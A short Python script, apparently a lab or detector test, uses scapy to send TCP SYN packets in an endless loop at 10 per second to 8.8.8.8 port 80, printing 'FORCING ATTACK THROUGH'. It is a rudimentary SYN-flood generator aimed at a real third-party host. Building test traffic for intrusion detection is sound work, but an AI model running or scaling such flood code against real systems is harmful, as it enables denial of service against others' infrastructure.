import sys, os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import time
import random
from scapy.all import send, IP, TCP, conf
from net_utils import get_active_interface_name

TARGET_IP = "8.8.8.8"
IFACE_NAME = get_active_interface_name()

print(f"FORCING ATTACK THROUGH: {IFACE_NAME}")
print(f"TARGET: {TARGET_IP}")

try:
    while True:
        # יצירת חבילה
        pkt = IP(dst=TARGET_IP) / TCP(dport=80, flags="S")
        
        # שליחה מפורשת דרך הממשק שלנו
        send(pkt, iface=IFACE_NAME, verbose=0)
        
        print(f"Sent packet to {TARGET_IP} via {IFACE_NAME}")
        time.sleep(0.1) # קצב של 10 בשנייה לבדיקה

except KeyboardInterrupt:
    print("Stopped.")
except Exception as e:
    print(f"Error: {e}")